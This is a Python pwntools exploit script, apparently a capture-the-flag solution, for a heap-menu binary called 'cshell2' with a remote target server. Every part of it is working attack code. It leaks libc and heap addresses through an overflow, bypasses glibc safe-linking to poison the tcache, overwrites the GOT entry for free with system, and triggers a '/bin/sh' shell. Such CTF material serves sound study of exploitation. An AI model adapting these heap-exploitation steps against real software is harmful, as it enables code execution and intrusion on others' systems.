#!/usr/bin/python3

from pwn import *

elf = ELF('cshell2')
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "b *0x4015EB",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("be.ax", 31667)
	else:
		return process(elf.path, env=env)

env = {
	"LD_PRELOAD": "./libc.so.6"
}
p = get_conn(env=env)
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
lw = lambda s: log.warn(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

choice_banner = b'5 re-age user'

def add(idx, size, firstname, middlename, lastname, age, bio):
	sla(choice_banner, b'1')
	sla(b'Enter index: ', str(idx).encode())
	sla(b'Enter size (1032 minimum): ', str(size).encode())
	sa(b'Input firstname: ', firstname)
	sa(b'Input middlename: ', middlename)
	sa(b'Input lastname: ', lastname)
	sla(b'Input age: ', str(age).encode())
	sa(b'Input bio: ', bio)

def edit(idx, firstname, middlename, lastname, age, bio):
	sla(choice_banner, b'4')
	sla(b'Enter index: ', str(idx).encode())
	sa(b'Input firstname: ', firstname)
	sa(b'Input middlename: ', middlename)
	sa(b'Input lastname: ', lastname)
	sla(b'Input age: ', str(age).encode())
	sa(b'Input bio: ', bio)

def free(idx):
	sla(choice_banner, b'3')
	sla(b'Enter index: ', str(idx).encode())

def show(idx):
	sla(choice_banner, b'2')
	sla(b'Enter index: ', str(idx).encode())
	rl(), rl()
	data = rl()
	bio = ru(b'1 Add')

	# print(data)
	# print(bio)
	return data, bio


for i in range(0, 10):
	add(i, 1032, p8(0xff), p8(0xff), b'C'*8, 0x1337, p8(i)*0x100)

add(10, 1032 * 2, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'u'*0x100)
add(11, 1232, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'u'*0x100)
add(12, 1232, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'u'*0x100)

for i in range(0, 10):
	free(i)

free(11)

add(13, 1032, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'k'*0x100)

pad_len = 1032-56
edit(13, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'k'*pad_len)
_, bio = show(13)
libc_leak = u64(bio[pad_len + 5:].ljust(8, b'\x00'))
ls(f'libc leak {hex(libc_leak)}')

libc_base = libc_leak - 0x1c7cc0
ls(f'libc base {hex(libc_base)}')


pad_len = 1032-48
edit(13, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'k'*pad_len)
_, bio = show(13)
leak_heap = u64(bio[pad_len + 5:].ljust(8, b'\x00'))
ls(f'leak heap {hex(leak_heap)}')

heap_base = leak_heap - 0x3350
ls(f'heap base {hex(heap_base)}')

# restore data
pad_len = 1032-48-0x10
edit(13, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'k'*pad_len + p64(0xc31) + p64(libc_leak) + p64(leak_heap))

# clear - now 13 is adjacent to topchunk
free(10)
free(12)


add(0, 1032, p8(0xff), p8(0xff), b'C'*8, 0x1337, p8(0x64)*8)
free(13)

# https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/
alloced_addr = heap_base + 0x1b00
xored_ptr = (alloced_addr >> 12) ^ (0x404000)

pad_len = 1032-48-0x10
edit(0, p8(0xff), p8(0xff), b'C'*8, 0x1337, b'k'*pad_len + p64(0x411) + p64(xored_ptr))

add(1, 1032, p8(0xff), p8(0xff), b'C'*8, 0x1337, p8(0x64)*8)

libc = ELF("./libc.so.6")
libc.address = libc_base
# set free to system
add(2, 1032, p8(0), p8(0), b'C'*8, libc.symbols["system"], p64(libc.symbols["malloc"]))  # <- chunk in got

edit(0, b'/bin/sh\x00', p8(0xff), b'C'*8, 0x1337, b'k')
free(0)

ia()
